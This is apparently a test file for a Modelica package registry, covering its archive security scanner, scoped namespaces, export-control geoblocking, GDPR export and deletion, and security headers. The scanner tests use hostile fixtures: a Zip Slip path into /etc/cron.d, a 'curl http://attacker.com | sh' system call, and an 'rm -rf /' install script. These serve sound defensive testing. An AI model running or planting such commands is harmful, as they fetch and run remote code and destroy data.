// SPDX-License-Identifier: AGPL-3.0-or-later

import AdmZip from "adm-zip";
import jwt from "jsonwebtoken";
import assert from "node:assert";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import test from "node:test";
import request from "supertest";

process.env["NODE_ENV"] = "test";

import { createApp } from "../src/app.js";
import { LibraryDatabase } from "../src/database.js";
import { JobQueue } from "../src/jobs.js";
import { JWT_SECRET } from "../src/middleware/auth-middleware.js";
import { LibraryStorage } from "../src/storage.js";
import { isOfacSanctioned } from "../src/util/compliance.js";
import { scanPackageArchive } from "../src/util/package-scanner.js";

function createZipWithFiles(files: Record<string, string | Buffer>): Buffer {
  const zip = new AdmZip();
  for (const [name, content] of Object.entries(files)) {
    zip.addFile(name, typeof content === "string" ? Buffer.from(content, "utf-8") : content);
  }
  return zip.toBuffer();
}

function createZipWithZipSlip(): Buffer {
  const zip = new AdmZip();
  zip.addFile("package.mo", Buffer.from('package SlipLib\n  annotation(version="1.0.0");\nend SlipLib;\n'));
  zip.addFile("dummy.txt", Buffer.from("malicious payload"));
  const entry = zip.getEntries().find((e) => e.entryName === "dummy.txt")!;
  entry.entryName = "../../etc/cron.d/malicious";
  return zip.toBuffer();
}

test("Package Supply Chain Security & OFAC Compliance", async (t) => {
  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), "supply-chain-test-"));
  const dbDir = path.join(tmpDir, "db");
  const storageDir = path.join(tmpDir, "storage");
  fs.mkdirSync(dbDir, { recursive: true });
  fs.mkdirSync(storageDir, { recursive: true });

  const db = new LibraryDatabase(dbDir);
  const storage = new LibraryStorage(storageDir);
  const jobQueue = new JobQueue();
  const app = createApp({ database: db, storage, jobQueue });

  t.after(() => {
    try {
      jobQueue.clear();
      db.db.close();
      fs.rmSync(tmpDir, { recursive: true, force: true });
    } catch {
      // Ignore cleanup error
    }
  });

  const user = db.createUser("sec", "sec@modelscript.test", "hashed_pwd", { emailVerified: true });
  const authToken = jwt.sign({ id: user.id, username: user.username, email: user.email }, JWT_SECRET, {
    expiresIn: "1h",
  });

  await t.test("scanPackageArchive validates clean archives and detects threats", async () => {
    // 1. Clean archive
    const cleanZip = createZipWithFiles({
      "package.mo": 'package CleanLib\n  annotation(version="1.0.0");\nend CleanLib;\n',
      "README.md": "# Clean Library Documentation\n",
    });
    const cleanResult = await scanPackageArchive(cleanZip);
    assert.strictEqual(cleanResult.valid, true);
    assert.strictEqual(cleanResult.violations.length, 0);

    // 2. Zip Slip attack
    const zipSlipZip = createZipWithZipSlip();
    const zipSlipResult = await scanPackageArchive(zipSlipZip);
    assert.strictEqual(zipSlipResult.valid, false);
    assert.ok(zipSlipResult.violations.some((v) => v.includes("Zip Slip path traversal")));

    // 3. Prohibited binary executable
    const executableZip = createZipWithFiles({
      "package.mo": 'package ExeLib\n  annotation(version="1.0.0");\nend ExeLib;\n',
      "bin/trojan.exe": Buffer.from("MZ\x90\x00\x03\x00\x00\x00"),
    });
    const exeResult = await scanPackageArchive(executableZip);
    assert.strictEqual(exeResult.valid, false);
    assert.ok(exeResult.violations.some((v) => v.includes("Prohibited executable or binary")));

    // 4. Malicious Modelica code with system() call
    const maliciousModelicaZip = createZipWithFiles({
      "package.mo":
        'package HackLib\n  annotation(version="1.0.0");\n  function runCmd\n    external "C" system("curl http://attacker.com | sh");\n  end runCmd;\nend HackLib;\n',
    });
    const astResult = await scanPackageArchive(maliciousModelicaZip);
    assert.strictEqual(astResult.valid, false);
    assert.ok(astResult.violations.some((v) => v.includes("Dangerous native process/library invocation")));
  });

  await t.test("POST /api/v1/libraries/:name/:version enforces scoped package namespaces", async () => {
    const unscopedZip = createZipWithFiles({
      "package.mo": 'package UnscopedPackage\n  annotation(version="1.0.0");\nend UnscopedPackage;\n',
    });

    // Attempting to publish an unscoped package by a regular user is rejected (403)
    const unscopedRes = await request(app)
      .post("/api/v1/libraries/UnscopedPackage/1.0.0")
      .set("Authorization", `Bearer ${authToken}`)
      .attach("file", unscopedZip, "unscoped.zip")
      .expect(403);

    assert.ok(unscopedRes.body.error.includes("Unscoped package names are reserved for curated core libraries"));
  });

  await t.test("POST /api/v1/libraries/:name/:version rejects packages failing security scan", async () => {
    const dangerousZip = createZipWithFiles({
      "package.mo": 'package DangerousLib\n  annotation(version="1.0.0");\nend DangerousLib;\n',
      "install.sh": "#!/bin/bash\nrm -rf /;\n",
    });

    const rejectRes = await request(app)
      .post("/api/v1/libraries/@sec/DangerousLib/1.0.0")
      .set("Authorization", `Bearer ${authToken}`)
      .attach("file", dangerousZip, "dangerous.zip")
      .expect(400);

    assert.ok(rejectRes.body.error.includes("rejected by security scanner"));
    assert.ok(rejectRes.body.violations.some((v: string) => v.includes("Prohibited executable")));

    // Verify audit log entry
    const logs = db.getAuditLogs(10, 0, "package_upload_quarantined");
    assert.ok(logs.length >= 1);
  });

  await t.test("POST /api/v1/libraries/:name/:version accepts valid clean scoped package and logs audit", async () => {
    const validZip = createZipWithFiles({
      "package.mo": 'package ValidLib\n  annotation(version="1.0.0");\nend ValidLib;\n',
      "README.md": "# Valid Library\n",
    });

    const successRes = await request(app)
      .post("/api/v1/libraries/@sec/ValidLib/1.0.0")
      .set("Authorization", `Bearer ${authToken}`)
      .attach("file", validZip, "valid.zip")
      .expect(201);

    assert.strictEqual(successRes.body.processing, "pending");
    assert.ok(successRes.body.contentHash.startsWith("sha256:"));

    // Verify audit log entry
    const publishLogs = db.getAuditLogs(10, 0, "package_published");
    assert.ok(publishLogs.length >= 1);
    assert.strictEqual(publishLogs[0].resource_id, "@sec/ValidLib@1.0.0");
  });

  await t.test("isOfacSanctioned accurately identifies sanctioned jurisdictions under overcompliance policy", () => {
    assert.strictEqual(isOfacSanctioned("IR"), true);
    assert.strictEqual(isOfacSanctioned("ir"), true);
    assert.strictEqual(isOfacSanctioned("KP"), true);
    assert.strictEqual(isOfacSanctioned("SY"), true);
    assert.strictEqual(isOfacSanctioned("CU"), true);
    assert.strictEqual(isOfacSanctioned("RU"), true);
    assert.strictEqual(isOfacSanctioned("BY"), true);
    assert.strictEqual(isOfacSanctioned("VE"), true);
    assert.strictEqual(isOfacSanctioned("MM"), true);
    assert.strictEqual(isOfacSanctioned("CN"), true);
    assert.strictEqual(isOfacSanctioned("AF"), true);
    assert.strictEqual(isOfacSanctioned("SD"), true);
    assert.strictEqual(isOfacSanctioned("YE"), true);
    assert.strictEqual(isOfacSanctioned("US"), false);
    assert.strictEqual(isOfacSanctioned("DE"), false);
    assert.strictEqual(isOfacSanctioned("FR"), false);
    assert.strictEqual(isOfacSanctioned(null, "UA-43"), true); // Crimea
    assert.strictEqual(isOfacSanctioned("UA", "43"), true); // Crimea via country+subdivision
    assert.strictEqual(isOfacSanctioned(null, "UA-14"), true); // Donetsk
  });

  await t.test("OFAC export control geofencing blocks compute dispatch and package publishing", async () => {
    // 1. Cloud simulation dispatch from Iran (IR) is blocked (403)
    const cloudBlockedRes = await request(app)
      .post("/api/v1/cloud/dispatch")
      .set("cf-ipcountry", "IR")
      .send({
        domain: "modelica",
        name: "TestSimulation",
        profile: "standard",
      })
      .expect(403);

    assert.ok(cloudBlockedRes.body.error.includes("OFAC / EAR / ITAR export control regulations"));
    assert.strictEqual(cloudBlockedRes.body.jurisdiction, "IR");

    // 2. CAE job dispatch from Syria (SY) is blocked (403)
    const caeBlockedRes = await request(app)
      .post("/api/v1/cae/jobs")
      .set("x-country-code", "SY")
      .send({
        solver: "calculix",
        title: "Thermal Stress Job",
        deck: { content: "*HEADING\n" },
      })
      .expect(403);

    assert.ok(caeBlockedRes.body.error.includes("OFAC / EAR / ITAR export control regulations"));

    // 3. Package publishing from North Korea (KP) is blocked (403)
    const cleanZip = createZipWithFiles({
      "package.mo": 'package BlockedLib\n  annotation(version="1.0.0");\nend BlockedLib;\n',
    });

    const publishBlockedRes = await request(app)
      .post("/api/v1/libraries/@sec/BlockedLib/1.0.0")
      .set("Authorization", `Bearer ${authToken}`)
      .set("x-country-code", "KP")
      .attach("file", cleanZip, "blocked.zip")
      .expect(403);

    assert.ok(publishBlockedRes.body.error.includes("OFAC / EAR / ITAR export control regulations"));

    // Verify compliance audit logs recorded
    const blockedLogs = db.getAuditLogs(10, 0, "export_control_blocked");
    assert.ok(blockedLogs.length >= 3);
  });

  await t.test("export control geofencing blocks compute leakage vectors, registration, and GeoIP", async () => {
    // 1. /simulate endpoint blocked from Russia (RU)
    const simRes = await request(app)
      .post("/api/v1/simulate")
      .set("cf-ipcountry", "RU")
      .send({ code: "model M end M;" })
      .expect(403);
    assert.ok(simRes.body.error.includes("OFAC / EAR / ITAR export control regulations"));

    // 2. /physics/run endpoint blocked from Belarus (BY)
    const physicsRes = await request(app)
      .post("/api/v1/physics/run")
      .set("x-country-code", "BY")
      .send({ script: "x = 1;" })
      .expect(403);
    assert.ok(physicsRes.body.error.includes("OFAC / EAR / ITAR export control regulations"));

    // 3. /auth/register blocked from North Korea (KP)
    const regRes = await request(app)
      .post("/api/v1/auth/register")
      .set("cf-ipcountry", "KP")
      .send({ username: "bad_actor", email: "actor@kp.test", password: "Password123!" })
      .expect(403);
    assert.ok(regRes.body.error.includes("OFAC / EAR / ITAR export control regulations"));

    // 4. IP Geolocation fallback blocks when CDN headers are absent
    const geoIpRes = await request(app)
      .post("/api/v1/simulate")
      .set("x-forwarded-for", "5.1.0.1") // Mock Russian IP in locationService
      .send({ code: "model M end M;" })
      .expect(403);
    assert.ok(geoIpRes.body.error.includes("OFAC / EAR / ITAR export control regulations"));
  });

  await t.test("GDPR Article 17 Right to Erasure and Article 20 Data Portability", async () => {
    // Create a user to test GDPR workflows
    const gdprUser = db.createUser("gdpr_user", "gdpr@test.org", "pwd_hash", { emailVerified: true });
    const gdprToken = jwt.sign({ id: gdprUser.id, username: gdprUser.username, email: gdprUser.email }, JWT_SECRET, {
      expiresIn: "1h",
    });

    // 1. Data portability export (GET /api/v1/users/me/export)
    const exportRes = await request(app)
      .get("/api/v1/users/me/export")
      .set("Authorization", `Bearer ${gdprToken}`)
      .expect(200);

    assert.strictEqual(exportRes.body.profile.email, "gdpr@test.org");
    assert.strictEqual(exportRes.body.profile.username, "gdpr_user");
    assert.ok(Array.isArray(exportRes.body.posts));
    assert.ok(Array.isArray(exportRes.body.libraries));

    // 1b. Offline HTML viewer and ZIP export (GET /api/v1/users/me/export?format=zip)
    const exportZipRes = await request(app)
      .get("/api/v1/users/me/export?format=zip")
      .set("Authorization", `Bearer ${gdprToken}`)
      .expect(200);
    assert.strictEqual(exportZipRes.headers["content-type"], "application/zip");
    assert.ok(exportZipRes.headers["content-disposition"]?.includes("modelscript-archive-gdpr_user.zip"));

    // 2. Right to erasure (DELETE /api/v1/users/me)
    const deleteRes = await request(app)
      .delete("/api/v1/users/me")
      .set("Authorization", `Bearer ${gdprToken}`)
      .expect(200);

    assert.strictEqual(deleteRes.body.success, true);

    // Verify user profile is redacted in the database
    const anonymized = db.getUserById(gdprUser.id);
    assert.strictEqual(anonymized.email, `deleted_${gdprUser.id}@deleted.modelscript.local`);
    assert.strictEqual(anonymized.username, `deleted_${gdprUser.id}`);
    assert.strictEqual(anonymized.status, "deleted");

    // Verify compliance audit log recorded
    const gdprLogs = db.getAuditLogs(10, 0, "user_account_deleted_gdpr");
    assert.ok(gdprLogs.length >= 1);
  });

  await t.test("RFC 9116 security.txt disclosure", async () => {
    const res = await request(app).get("/.well-known/security.txt").expect(200);
    assert.ok(res.text.includes("Contact: mailto:security@modelscript.org"));
    assert.ok(res.text.includes("Canonical: https://modelscript.org/.well-known/security.txt"));

    const aliasRes = await request(app).get("/security.txt").expect(200);
    assert.ok(aliasRes.text.includes("Contact: mailto:security@modelscript.org"));
  });

  await t.test("Legal, AGPLv3 Section 13, and defensive security headers", async () => {
    const res = await request(app).get("/legal").expect(200);
    assert.strictEqual(res.body.license, "AGPL-3.0-or-later");
    assert.ok(res.body.sourceCode.includes("github.com/modelscript"));
    assert.ok(res.body.agplNotice.includes("Corresponding Source"));

    // Verify defensive security headers (OWASP, SOC 2, ISO 27001)
    assert.strictEqual(res.headers["x-content-type-options"], "nosniff");
    assert.strictEqual(res.headers["x-frame-options"], "SAMEORIGIN");
    assert.ok(res.headers["strict-transport-security"].includes("max-age=31536000"));
    assert.strictEqual(res.headers["referrer-policy"], "strict-origin-when-cross-origin");
  });
});
